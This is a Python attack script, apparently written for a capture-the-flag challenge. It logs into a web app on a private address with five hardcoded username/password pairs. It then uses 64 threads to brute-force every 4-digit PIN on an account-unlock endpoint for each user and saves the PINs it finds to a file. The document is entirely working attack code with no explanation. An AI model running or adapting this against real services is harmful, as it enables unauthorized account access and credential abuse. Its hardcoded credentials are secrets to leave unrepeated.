#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
BASE = "http://10.0.187.139:5000"
CREDS = {"Zuko":"i-HaVe-REgaINEd_mY_h0NOr!","OSIRIS":"enjoy_the_ctf_good_luck!",
         "Walter_W":"I-AM_HEISENBURGGER","Zoro":"NEEDMOREPAINT",
         "superdiscreetflaguser":"password123"}
out={}
for u,p in CREDS.items():
    s=requests.Session(); s.post(f"{BASE}/login",data={"username":u,"password":p},timeout=15)
    F={"session":s.cookies.get("session")}; hit=[]
    def go(n):
        if hit: return
        try:
            r=requests.post(f"{BASE}/account/unlisted/unlock",data={"pin":f"{n:04d}"},
                            cookies=F,timeout=20,allow_redirects=False)
            if r.status_code!=403: hit.append(f"{n:04d}")
        except Exception: pass
    with ThreadPoolExecutor(max_workers=64) as ex:
        fs=[ex.submit(go,i) for i in range(10000)]
        for f in as_completed(fs):
            if hit: break
    out[u]=hit[0] if hit else None
    print(f"  {u:22} {out[u]}", flush=True)
open("pins_new.txt","w").write(repr(out)); print(out)
